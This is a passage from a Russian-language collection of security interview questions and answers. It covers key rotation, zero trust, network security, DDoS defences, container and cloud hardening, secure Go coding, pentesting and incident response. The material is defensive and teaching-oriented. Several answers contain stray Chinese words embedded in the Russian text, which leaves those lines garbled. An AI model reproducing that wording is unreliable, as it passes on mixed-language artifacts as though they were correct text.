    * **SOPS (Mozilla) + age/PGP:**
      * Шифрует значения в YAML, оставляя ключи читаемыми.
      * Интеграция с ArgoCD / Flux через Kustomize plugin.
    * **External Secrets Operator:**
      * `ExternalSecret` CRD → controller читает из Vault / AWS SM / GCP SM → создаёт K8s Secret.
      * Синхронизация, auto-refresh.
    * **Vault Agent / CSI Provider:**
      * Pod через sidecar или CSI volume получает секреты напрямую из Vault.
      * Auto-renewal, no K8s Secret объект.

    </details>

  ---

  - Вопрос №33: [ Что такое key rotation? Как реализовать без даунтайма? ]

    <details>
      <summary>Ответ</summary>

    * **Key rotation** — периодическая смена ключей/секретов.
    * **Зачем:** компрометация, compliance (PCI-DSS требует ротацию раз в год), best practice.
    * **Strategies:**
      * **Overlap period (grace period):** старый и новый ключ одновременно валидны N дней. Приложения
        постепенно переключаются. Затем старый удаляется.
      * **Blue-green:** новый ключ в новой конфигурации, переключение traffic → старый удаляется.
      * **Versioned keys:** JWT подписывается `kid: v2`, сервер поддерживает `v1` и `v2` одновременно.
    * **В Go:**
      * `key.Set` — множество ключей, rotation по `kid` (key ID).
      * JWKS endpoint — публикует все валидные public keys.
    * **Для БД credentials:**
      * Dual credentials в connection string (primary + fallback).
      * Vault dynamic secrets — ротация не нужна (короткий TTL).
    * **Для TLS сертификатов:**
      * `cert-manager` автоматически перевыпускает за 30 дней до истечения.
      * Сервер hot-reload сертификатов (Go: `tls.Config.GetCertificate`).

    </details>

  ---

  - Вопрос №34: [ Что такое zero-trust security model? ]

    <details>
      <summary>Ответ</summary>

    * **Zero Trust** — модель безопасности, в которой **никому** не доверяют по умолчанию, даже внутри
      сети.
    * **Принципы:**
      * **Never trust, always verify** — каждый запрос аутентифицируется и авторизуется.
      * **Least privilege** — минимальные права.
      * **Microsegmentation** — сеть разделена на мелкие зоны, доступ между ними явно разрешён.
      * **Continuous verification** — не разовый login, а постоянная проверка контекста (device, location,
        behavior).
    * **Архитектура:**
      * Identity-aware proxy (Google BeyondCorp, Cloudflare Access).
      * mTLS между сервисами.
      * Policy engine (OPA, Zanzibar) для авторизации каждого запроса.
      * Device posture — проверка состояния устройства.
    * **vs традиционный подход:** традиционный — "castle and moat" (firewall по периметру, внутри всё
      доверено). Zero trust — нет периметра доверия.

    </details>

  ---

</details>

---

## 5. Сетевая безопасность

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №35: [ Что такое DMZ? Как организовать сетевую безопасность? ]

    <details>
      <summary>Ответ</summary>

    * **DMZ (Demilitarized Zone)** — промежуточная сеть между интернетом и внутренней сетью. Содержит
      публично доступные серверы (web, mail, DNS), но не имеет доступа во внутреннюю сеть.
    * **Архитектура:**
      * Internet → External Firewall → DMZ (web servers, load balancer) → Internal Firewall →
        Internal Network (БД, приложения).
    * **Принципы сетевой безопасности:**
      * **Defense in depth** — несколько слоёв защиты (firewall, WAF, network policy, app-level auth).
      * **Least privilege** — минимальные правила firewall. Default deny.
      * **Segmentation** — разделение сети на зоны. БД-сеть не доступна из интернета.
      * **Stateful firewall** — отслеживание состояния соединений.
      * **Egress filtering** — ограничение исходящего трафика (server не должен ходить в интернет
        произвольно).
    * **В Kubernetes:** NetworkPolicies — ограничение трафика между pod'ами. Default deny ingress +
      egress.

    </details>

  ---

  - Вопрос №36: [ Что такое WAF? Чем отличается от IPS/IDS? ]

    <details>
      <summary>Ответ</summary>

    * **WAF (Web Application Firewall)** — анализирует HTTP-трафик на уровне приложения (L7). Защищает от
      OWASP Top 10 (SQLi, XSS, SSRF, etc.).
      * Работает с HTTP request/response (headers, body, params).
      * Примеры: AWS WAF, Cloudflare WAF, ModSecurity.
      * Правила: signature-based (regex), behavioral, ML-based.
    * **IDS (Intrusion Detection System)** — пассивный мониторинг, обнаружение подозрительной активности,
      alerting. Не блокирует.
    * **IPS (Intrusion Prevention System)** — активная защита, блокирует обнаруженные атаки. Часто на
      уровне сети (L3-L4), но может и L7.
    * **Разница:**
      | | WAF | IPS/IDS |
      |--|-----|---------|
      | Уровень | L7 (HTTP) | L3-L7 |
      | Фокус | Web-уязвимости | Сетевые атаки, malware, port scan |
      | Действие | Block / allow | IDS: alert. IPS: block |
    * **WAF — не замена** безопасному коду. Обходится (encoding, alternative syntax). Defense in depth.

    </details>

  ---

  - Вопрос №37: [ Что такое DDoS? Какие бывают типы? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **DDoS (Distributed Denial of Service)** — атака с множества источников (botnet), направленная на
      исчерпание ресурсов или пропускной способности.
    * **Типы:**
      * **Volumetric** — заполнение полосы пропускания. UDP flood, amplification (DNS, NTP, Memcached).
      * **Protocol** — исчерпание ресурсов сети/state. SYN flood, Ping of Death, Smurf.
      * **Application (L7)** — исчерпание ресурсов приложения. HTTP flood, slowloris, slow POST.
    * **Защита:**
      * **CDN / Anti-DDoS сервис** — Cloudflare, AWS Shield, Google Cloud Armor. Фильтрация трафика до
        достижения сервера.
      * **Rate limiting** — на Nginx / API gateway / app level.
      * **SYN cookies** — защита от SYN flood (ядро Linux включает автоматически).
      * **Connection limits** — max connections per IP, timeout для slow connections.
      * **Geo-blocking** — блокировка регионов, откуда не ожидается трафик.
      * **Challenge-response** — JS challenge, CAPTCHA для подозрительных клиентов.
      * **Autoscaling** — выдержать всплеск (дорого, но спасает от downtime).
      * **Anycast** — распределение трафика по дата-центрам.

    </details>

  ---

  - Вопрос №38: [ Что такое VPN и какие бывают типы? ]

    <details>
      <summary>Ответ</summary>

    * **VPN (Virtual Private Network)** — зашифрованный туннель между клиентом и сервером (или двумя
      сетями) поверх публичной сети.
    * **Типы:**
      * **Site-to-Site** — соединение двух сетей (офис-офис, on-prem ↔ cloud). IPsec, WireGuard.
      * **Remote Access** — клиент подключается к корпоративной сети. OpenVPN, WireGuard, IPSec/IKEv2.
      * **TLS VPN** — SSL VPN portal (доступ через браузер). Cisco AnyConnect, Pulse Secure.
    * **Протоколы:**
      * **WireGuard** — современный, быстрый, простой код (~4000 строк). ChaCha20-Poly1305, Curve25519.
      * **OpenVPN** —成熟, но медленнее. TLS-based.
      * **IPsec** — стандарт, сложный. ESP + IKE.
    * **Zero Trust替代 VPN:** вместо полного доступа к сети — identity-aware proxy к конкретным
      приложениям. BeyondCorp, Tailscale (WireGuard + ACL).

    </details>

  ---

  - Вопрос №39: [ Что такое DNSSEC и зачем нужен? ]

    <details>
      <summary>Ответ</summary>

    * **DNSSEC (DNS Security Extensions)** — цифровая подпись DNS-записей для защиты от spoofing/cache
      poisoning.
    * **Как работает:**
      * Каждая DNS-зона имеет пару ключей (KSK — Key Signing Key, ZSK — Zone Signing Key).
      * DNS-ответы подписаны RRSIG (signature). Клиент проверяет подпись по DNSKEY.
      * Chain of trust: Root → TLD (.com) → domain. DS records связывают уровни.
    * **Что защищает:** целостность и подлинность DNS-ответов. **Не** шифрует (DNS остаётся открытым).
    * **DNS over HTTPS (DoH) / DNS over TLS (DoT)** — шифрование DNS-трафика (конфиденциальность). Не
      заменяет DNSSEC, дополняет.

    </details>

  ---

  - Вопрос №40: [ Что такое security headers? Какие основные? ]

    <details>
      <summary>Ответ</summary>

    * **Security headers** — HTTP-заголовки, инструктирующие браузер о правилах безопасности.
    * **Основные:**
      * **Strict-Transport-Security (HSTS)** — `max-age=31536000; includeSubDomains; preload`. Принудительный
        HTTPS.
      * **Content-Security-Policy (CSP)** — `default-src 'self'; script-src 'self'`. Ограничивает
        источники ресурсов.
      * **X-Frame-Options** — `DENY` или `SAMEORIGIN`. Защита от clickjacking.
      * **X-Content-Type-Options** — `nosniff`. Запрет MIME-sniffing.
      * **Referrer-Policy** — `strict-origin-when-cross-origin`. Контроль泄露 referrer.
      * **Permissions-Policy** — `geolocation=(), camera=()`. Контроль API браузера.
      * **Cross-Origin-Opener-Policy (COOP)** — `same-origin`. Защита от Spectre-подобных атак.
      * **Cross-Origin-Embedder-Policy (COEP)** — `require-corp`. Контроль cross-origin ресурсов.
    * **Проверка:** securityheaders.com, Mozilla Observatory.

    </details>

  ---

</details>

---

## 6. Безопасность контейнеров и облака

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №41: [ Как защитить Docker-контейнер? ]

    <details>
      <summary>Ответ</summary>

    * **Образ:**
      * **Минимальный base image** — `alpine`, `scratch`, `distroless`. Меньше пакетов — меньше уязвимостей.
      * **Multi-stage build** — финальный образ не содержит компиляторов, исходников.
      * **Сканер уязвимостей** — Trivy, Grype, Snyk. Сканировать в CI/CD.
      * **Подпись образа** — Cosign, Notary. Проверка подписи перед pull.
      * **Не хранить секреты** в слоях образа (ENV, COPY .env).
    * **Runtime:**
      * **Non-root user** — `USER 1000:1000` в Dockerfile. `--read-only` filesystem.
      * **Удалить capabilities** — `--cap-drop ALL`, добавлять только нужные.
      * **No new privileges** — `--security-opt no-new-privileges`.
      * **Resource limits** — `--memory`, `--cpus`. Защита от fork bomb.
      * **Network isolation** — отдельная сеть, нет доступа к host network.
      * **Seccomp / AppArmor** — ограничение syscalls.
      * **Не монтировать Docker socket** (`/var/run/docker.sock`) — эквивалентно root на хосте.
    * **Registry:**
      * Private registry с auth.
      * RBAC на push/pull.

    </details>

  ---

  - Вопрос №42: [ Что такое CIS Benchmarks? ]

    <details>
      <summary>Ответ</summary>

    * **CIS (Center for Internet Security) Benchmarks** — рекомендации по безопасной конфигурации
      систем.
    * **Покрытие:** ОС (Linux, Windows), Docker, Kubernetes, cloud providers (AWS, GCP, Azure), БД, web
      servers.
    * **Структура:** Level 1 (базовые, низкий риск) и Level 2 (строгие, возможен impact).
    * **Примеры рекомендаций (Docker):**
      * Создать отдельную partition для `/var/lib/docker`.
      * Аудит Docker daemon: `auditctl -w /usr/bin/dockerd -k docker`.
      * Ограничить доступ к Docker socket.
      * Использовать user namespace remapping.
    * **Инструменты проверки:** `kube-bench` (K8s CIS), `Docker Bench for Security`, Lynis.
    * **В CI/CD:** запускать benchmark scans, fail build при критичных нарушениях.

    </details>

  ---

  - Вопрос №43: [ Что такое IAM в облаке? Best practices? ]

    <details>
      <summary>Ответ</summary>

    * **IAM (Identity and Access Management)** — управление пользователями, ролями, правами в облаке.
    * **Концепции:**
      * **Principals** — кто (user, service account, role).
      * **Roles** — набор permissions (`roles/storage.objectViewer`).
      * **Policies** — привязка principal + role к resource.
      * **Conditions** — ограничение по времени, IP, resource attributes.
    * **Best practices:**
      * **Least privilege** — минимальные права. Регулярный аудит unused permissions.
      * **No long-lived keys** — использовать временные credentials (STS, workload identity).
      * **Separate accounts** — dev / staging / prod. Изоляция.
      * **MFA** для human users. enforce на org level.
      * **Service accounts** для приложений, не human users. Workload Identity (GCP), IRSA (AWS).
      * **Audit logs** — включить, monitor аномалии.
      * **IAM Conditions** — доступ только в рабочее время, только из VPN.
      * **SCIM** — автоматическое provisioning/deprovisioning пользователей.

    </details>

  ---

  - Вопрос №44: [ Что такое supply chain attack? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **Supply chain attack** — атака через зависимости (библиотеки, пакеты, образы, CI/CD).
    * **Примеры:**
      * Вредоносный пакет в npm/PyPI с именем, похожим на оригинал (typosquatting).
      * Compromised upstream dependency (event-stream в npm).
      * Вредоносный commit в open-source (через украденный токен мейнтейнера).
      * Backdoor в CI/CD pipeline.
    * **Защита:**
      * **Lock files** — `go.sum`, `package-lock.json`, `poetry.lock`. Пинить версии.
      * **Dependency scanning** — Dependabot, Snyk, `govulncheck`. Автоматические PR на обновления.
      * **SBOM (Software Bill of Materials)** — список всех зависимостей. CycloneDX, SPDX.
      * **Cosign / Sigstore** — подписание образов и артефактов. Проверка перед deploy.
      * **Private registry / proxy** — Nexus, Artifactory. Кэширование + политика.
      * **Reproducible builds** — одинаковый бинарник из исходников.
      * **Minimal dependencies** — меньше зависимостей = меньше риск.
      * **Code review + branch protection** — никто не может push напрямую в main.
      * **OIDC в CI/CD** — без long-lived tokens (GitHub Actions → AWS через OIDC).

    </details>

  ---

</details>

---

## 7. Безопасность в Go

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №45: [ Как безопасно работать с криптографией в Go? ]

    <details>
      <summary>Ответ</summary>

    * **Стандартная библиотека `crypto/`:**
      * `crypto/aes` — AES. Использовать только GCM (`crypto/cipher`), не CBC.
      * `crypto/rand` — CSPRNG. **Всегда** для salt, token, key generation. Никогда `math/rand`.
      * `crypto/sha256`, `crypto/sha512` — хеширование.
      * `crypto/hmac` — HMAC. `hmac.Equal` для constant-time сравнения.
      * `crypto/subtle.ConstantTimeCompare` — constant-time comparison.
      * `crypto/tls` — TLS. `tls.Config{MinVersion: tls.VersionTLS12}`.
      * `crypto/ed25519` — Ed25519 подписи (рекомендуется вместо RSA для подписей).
    * **`golang.org/x/crypto/`:**
      * `bcrypt` — хеширование паролей.
      * `argon2` — Argon2id (предпочтительно для новых систем).
      * `scrypt` — KDF.
      * `nacl/secretbox` — authenticated encryption (XSalsa20 + Poly1305).
    * **Правила:**
      * Не изобретать свою криптографию.
      * Не использовать `math/rand` для security purposes.
      * Не использовать `crypto/des` (устарел).
      * Не использовать RSA без OAEP (padding) / PSS (подписи).
      * Нельзя сравнивать hash/токены через `==` — использовать `subtle.ConstantTimeCompare`.

    </details>

  ---

  - Вопрос №46: [ Как защитить Go HTTP-сервер? ]

    <details>
      <summary>Ответ</summary>

    * **TLS:**
      ```go
      srv := &http.Server{
          TLSConfig: &tls.Config{
              MinVersion:               tls.VersionTLS12,
              PreferServerCipherSuites: true,
              CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
          },
          ReadHeaderTimeout: 5 * time.Second,  // slowloris protection
          IdleTimeout:       120 * time.Second,
          MaxHeaderBytes:    1 << 20, // 1 MB
      }
      ```
    * **Timeouts:** `ReadTimeout`, `WriteTimeout`, `IdleTimeout`, `ReadHeaderTimeout`. Без них —
      slowloris-уязвимость.
    * **Rate limiting:** middleware (`golang.org/x/time/rate`).
    * **Security headers:** middleware, добавляющее HSTS, CSP, X-Frame-Options, etc.
    * **CORS:** `rs/cors` или `go-chi/cors`. Не `Allow-Origin: *` с credentials.
    * **Input validation:** `validator` package, schema validation.
    * **SQL injection:** только parameterized queries (`db.Query("... WHERE id = $1", id)`).
    * **Body limits:** `http.MaxBytesReader` для ограничения размера тела запроса.
    * **Graceful shutdown:** `srv.Shutdown(ctx)` для завершения активных соединений.
    * **Recover middleware:** перехват panic, чтобы один panic не уронил весь сервер.

    </details>

  ---

  - Вопрос №47: [ Что такое `govulncheck`? Как использовать? ]

    <details>
      <summary>Ответ</summary>

    * **`govulncheck`** — официальный инструмент Go для проверки известных уязвимостей в зависимостях.
    * **Как работает:**
      * Анализирует `go.mod` / `go.sum`.
      * Сравнивает с Go Vulnerability Database (`https://vuln.go.dev`).
      * **Анализ reachable code** — проверяет, действительно ли уязвимый код вызывается в проекте
        (better than simple version matching).
    * **Использование:**
      ```bash
      go install golang.org/x/vuln/cmd/govulncheck@latest
      govulncheck ./...
      ```
    * **В CI/CD:** добавлять как step в pipeline. Fail build при high-severity vulnerabilities.
    * **GitHub:** Dependabot также поддерживает Go vulnerability alerts.
    * **Отличие от Dependabot/Snyk:** govulncheck анализирует call graph (reachable vulnerabilities),
      а не просто version matching. Меньше false positives.

    </details>

  ---

  - Вопрос №48: [ Как безопасно работать с файлами в Go? ]

    <details>
      <summary>Ответ</summary>

    * **Path traversal:** никогда не использовать пользовательский ввод напрямую в пути файла.
      * Плохо: `filepath.Join(baseDir, userInput)`.
      * Лучше: проверить, что результат внутри baseDir:
        ```go
        fullPath := filepath.Join(baseDir, userInput)
        if !strings.HasPrefix(filepath.Clean(fullPath), filepath.Clean(baseDir)+string(os.PathSeparator)) {
            return errors.New("path traversal detected")
        }
        ```
    * **Symlink attack:** `os.Open` следует по symlinks. Проверять `os.Lstat` перед открытием.
    * **TOCTOU:** между проверкой (stat) и использованием (open) файл может быть заменён. Использовать
      `O_NOFOLLOW` (открыть файл, не следуя symlink) или `os.OpenFile` с `O_NOFOLLOW`.
    * **Temp files:** `os.CreateTemp` (не `os.Create` с предсказуемым именем).
    * **File permissions:** `os.WriteFile(path, data, 0600)` — не world-readable для секретов.
    * **Limit file size:** `io.LimitReader` при чтении (защита от OOM при огромном файле).

    </details>

  ---

</details>

---

## 8. Security testing и аудит

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №49: [ Какие бывают виды security testing? ]

    <details>
      <summary>Ответ</summary>

    | Вид | Когда | Кто | Метод |
    |-----|-------|-----|-------|
    | **SAST** (Static App Security Testing) | CI/CD, commit | Автоматизированный | Анализ исходного кода без запуска |
    | **DAST** (Dynamic AST) | Staging / prod | Автоматизированный | Сканирование работающего приложения (black-box) |
    | **IAST** (Interactive AST) | Runtime (test env) | Автоматизированный | Инструмент в рантайме, видит data flow |
    | **SCA** (Software Composition Analysis) | CI/CD | Автоматизированный | Проверка зависимостей на CVE |
    | **Pen test** | Периодически | Человек (этичный хакер) | Ручной + автоматизированный |
    | **Bug bounty** | Постоянно | Внешние исследователи | Награда за найденные уязвимости |
    | **Threat modeling** | Дизайн | Команда | Анализ архитектуры до кода |

    * **SAST:** GoSec, CodeQL. Быстро, но много false positives.
    * **DAST:** OWASP ZAP, Burp Suite, Nuclei. Находит runtime-уязвимости.
    * **SCA:** `govulncheck`, Dependabot, Snyk, Trivy.
    * **Shift left:** находить уязвимости как можно раньше (design → code → CI → staging → prod).

    </details>

  ---

  - Вопрос №50: [ Что такое threat modeling? Как проводить? ]

    <details>
      <summary>Ответ</summary>

    * **Threat Modeling** — процесс анализа архитектуры для выявления угроз **до** написания кода.
    * **Методология (STRIDE):**
      * **S**poofing — подмена личности.
      * **T**ampering — изменение данных.
      * **R**epudiation — отрицание действия.
      * **I**nformation disclosure — утечка данных.
      * **D**enial of service — отказ в обслуживании.
      * **E**levation of privilege — повышение привилегий.
    * **Этапы:**
      1. **Diagram** — нарисовать архитектуру (data flow diagram). Компоненты, границы доверия, потоки
         данных.
      2. **Identify threats** — применить STRIDE к каждому компоненту/потоку.
      3. **Mitigate** — для каждой угрозы: устранить, снизить риск, передать (insurance), принять.
      4. **Validate** — проверить, что mitigations реализованы.
    * **Инструменты:** OWASP Threat Dragon, Microsoft TMT, draw.io + шаблоны.
    * **Когда:** при новом дизайне, при значимом изменении архитектуры, периодически для существующих
      систем.

    </details>

  ---

  - Вопрос №51: [ Что такое pentest? Какие бывают виды? ]

    <details>
      <summary>Ответ</summary>

    * **Penetration Test (Pentest)** — симуляция атаки на систему для выявления уязвимостей.
    * **Виды по информации:**
      * **Black-box** — pentester не знает ничего о системе (как внешний атакующий).
      * **White-box** — полный доступ к коду, архитектуре, credentials.
      * **Gray-box** — частичная информация (например, user account без admin прав).
    * **Виды по доступу:**
      * **External** — снаружи (интернет).
      * **Internal** — внутри сети (как скомпрометированный сотрудник).
      * **Physical** — физический доступ (взлом двери, USB drop).
    * **Этапы:**
      1. **Reconnaissance** — сбор информации.
      2. **Scanning** — поиск уязвимостей (nmap, ZAP).
      3. **Exploitation** — эксплуатация найденных уязвимостей (Metasploit, manual).
      4. **Post-exploitation** — что можно сделать после (lateral movement, data exfiltration).
      5. **Reporting** — документация с рекомендациями.
    * **Frequency:** минимум раз в год + при значимых изменениях. PCI-DSS требует ежегодный pentest.

    </details>

  ---

  - Вопрос №52: [ Что такое bug bounty program? Как организовать? ]

    <details>
      <summary>Ответ</summary>

    * **Bug Bounty** — программа, при которой внешние исследователи получают вознаграждение за найденные
      уязвимости.
    * **Платформы:** HackerOne, Bugcrowd, Intigriti.
    * **Преимущества:**
      * Непрерывное тестирование (vs разовый pentest).
      * Разнообразие исследователей и подходов.
      * Pay for results (не за время).
    * **Организация:**
      * **Scope** — чётко определить, что тестируется (домены, API, mobile apps).
      * **Out of scope** — что не тестируется (DDoS, social engineering).
      * **Reward tiers** — Critical ($5000+), High ($1000-5000), Medium ($500-1000), Low ($100-500).
      * **Response time** — SLA на triage и fix. Исследователи ценят коммуникацию.
      * **Safe harbor** — юридическая защита исследователей (в рамках правил).
    * **Private program** — приглашение проверенных исследователей, позже public launch.

    </details>

  ---

  - Вопрос №53: [ Что такое security incident response? Этапы? ]

    <details>
      <summary>Ответ</summary>

    * **Incident Response (IR)** — процесс обнаружения, анализа и устранения инцидентов безопасности.
    * **Этапы (NIST / SANS):**
      1. **Preparation** — IR plan, контакты, инструменты, обучение, tabletop exercises.
      2. **Identification** — обнаружение (alerts, SIEM, user reports). Триаж:是真 incident?
      3. **Containment** — ограничить распространение. Изолировать сервер, заблокировать account, rotate
         credentials. Short-term (stop bleeding) + long-term (prevent recurrence).
      4. **Eradication** — удалить malware, закрыть уязвимость, revoke stolen tokens.
      5. **Recovery** — восстановить сервисы, проверить целостность, monitor за аномалиями.
      6. **Lessons learned** — post-mortem. Что случилось, как, что улучшить. Обновить IR plan.
    * **Инструменты:**
      * SIEM (Splunk, Elastic SIEM, Grafana Loki) — корреляция событий.
      * EDR (CrowdStrike, SentinelOne) — endpoint detection & response.
      * IR runbooks — пошаговые инструкции для типовых инцидентов.
    * **Ключевой принцип:** не уничтожать evidence. Сохранить logs, memory dumps, disk images.

    </details>

  ---

  - Вопрос №54: [ Что такое OWASP Top 10? Как использовать? ]

    <details>
      <summary>Ответ</summary>

    * **OWASP Top 10** — список 10 наиболее критичных веб-уязвимостей, обновляемый OWASP (Open Worldwide
      Application Security Project).
    * **OWASP Top 10 (2021):**
      1. **A01: Broken Access Control**
      2. **A02: Cryptographic Failures** (бывший Sensitive Data Exposure)
      3. **A03: Injection** (SQLi, XSS, etc.)
      4. **A04: Insecure Design**
      5. **A05: Security Misconfiguration**
      6. **A06: Vulnerable and Outdated Components**
      7. **A07: Identification and Authentication Failures**
      8. **A08: Software and Data Integrity Failures**
      9. **A09: Security Logging and Monitoring Failures**
      10. **A10: Server-Side Request Forgery (SSRF)**
    * **Как использовать:**
      * Checklist для code review и threat modeling.
      * Обучение разработчиков — каждый должен знать Top 10.
      * SAST/DAST правила часто категоризированы по OWASP.
      * Security requirements — явно указывать защиту от каждого пункта.
    * **OWASP ASVS (Application Security Verification Standard)** — более детальный checklist (Level 1-3)
      для проверки приложений.

    </details>

  ---

</details>

---

## Полезные ресурсы

- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Go Security Checklist](https://github.com/OWASP/Go-SCP)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
- [Cloud Security Alliance](https://cloudsecurityalliance.org/)

---

## Связанные файлы

- [go-questions.md](go-questions.md) — Go-специфика
- [db-operations.md](db-operations.md) — безопасность БД
- [redis-devops-questions.md](redis-devops-questions.md) — Docker/K8s security
- [linux-internals.md](linux-internals.md) — OS security
- [system-design-questions.md](system-design-questions.md) — архитектура secure systems
